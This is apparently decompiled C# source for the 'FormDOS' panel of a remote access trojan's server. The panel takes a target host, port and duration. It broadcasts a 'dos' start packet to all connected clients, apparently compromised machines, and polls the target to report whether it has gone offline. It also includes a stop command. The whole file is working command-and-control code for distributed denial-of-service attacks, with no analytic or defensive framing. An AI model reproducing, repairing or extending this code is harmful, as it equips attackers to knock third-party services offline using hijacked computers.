using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000087 RID: 135
	public partial class FormDOS : Form
	{
		// Token: 0x06000360 RID: 864 RVA: 0x00003E8C File Offset: 0x0000208C
		public FormDOS()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000361 RID: 865 RVA: 0x00028D80 File Offset: 0x00026F80
		private void BtnAttack_Click(object sender, EventArgs e)
		{
			if (!string.IsNullOrWhiteSpace(this.txtHost.Text) && !string.IsNullOrWhiteSpace(this.txtPort.Text) && !string.IsNullOrWhiteSpace(this.txtTimeout.Text))
			{
				try
				{
					if (!this.txtHost.Text.ToLower().StartsWith("http://"))
					{
						this.txtHost.Text = "http://" + this.txtHost.Text;
					}
					new Uri(this.txtHost.Text);
				}
				catch
				{
					return;
				}
				if (this.PlguinClients.Count > 0)
				{
					try
					{
						this.btnAttack.Enabled = false;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "dos";
						msgPack.ForcePathObject("Option").AsString = "postStart";
						msgPack.ForcePathObject("Host").AsString = this.txtHost.Text;
						msgPack.ForcePathObject("Port").AsString = this.txtPort.Text;
						msgPack.ForcePathObject("Timeout").AsString = this.txtTimeout.Text;
						foreach (Clients clients in this.PlguinClients)
						{
							this.selectedClients.Add(clients);
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
						}
						this.btnStop.Enabled = true;
						this.timespan = TimeSpan.FromSeconds((double)(Convert.ToInt32(this.txtTimeout.Text) * 60));
						this.stopwatch = new Stopwatch();
						this.stopwatch.Start();
						this.timer1.Start();
						this.timer2.Start();
					}
					catch
					{
					}
				}
				return;
			}
		}

		// Token: 0x06000362 RID: 866 RVA: 0x00028FC0 File Offset: 0x000271C0
		private void BtnStop_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "dos";
				msgPack.ForcePathObject("Option").AsString = "postStop";
				foreach (Clients @object in this.PlguinClients)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
				}
				this.selectedClients.Clear();
				this.btnAttack.Enabled = true;
				this.btnStop.Enabled = false;
				this.timer1.Stop();
				this.timer2.Stop();
				this.status = "is online";
			}
			catch
			{
			}
		}

		// Token: 0x06000363 RID: 867 RVA: 0x000290A8 File Offset: 0x000272A8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.Text = string.Format("DOS ATTACK:{0}    Status:host {1}", this.timespan.Subtract(TimeSpan.FromSeconds((double)this.stopwatch.Elapsed.Seconds)), this.status);
			if (this.timespan < this.stopwatch.Elapsed)
			{
				this.btnAttack.Enabled = true;
				this.btnStop.Enabled = false;
				this.timer1.Stop();
				this.timer2.Stop();
				this.status = "is online";
			}
		}

		// Token: 0x06000364 RID: 868 RVA: 0x00029148 File Offset: 0x00027348
		private void Timer2_Tick(object sender, EventArgs e)
		{
			try
			{
				WebRequest.Create(new Uri(this.txtHost.Text)).GetResponse().Dispose();
				this.status = "is online";
			}
			catch
			{
				this.status = "is offline";
			}
		}

		// Token: 0x06000365 RID: 869 RVA: 0x000291A0 File Offset: 0x000273A0
		private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				foreach (Clients clients in this.PlguinClients)
				{
					clients.Disconnected();
				}
				this.PlguinClients.Clear();
				this.selectedClients.Clear();
			}
			catch
			{
			}
			base.Hide();
			base.Parent = null;
			e.Cancel = true;
		}

		// Token: 0x04000291 RID: 657
		private TimeSpan timespan;

		// Token: 0x04000292 RID: 658
		private Stopwatch stopwatch;

		// Token: 0x04000293 RID: 659
		private string status = "is online";

		// Token: 0x04000294 RID: 660
		public object sync = new object();

		// Token: 0x04000295 RID: 661
		public List<Clients> selectedClients = new List<Clients>();

		// Token: 0x04000296 RID: 662
		public List<Clients> PlguinClients = new List<Clients>();
	}
}
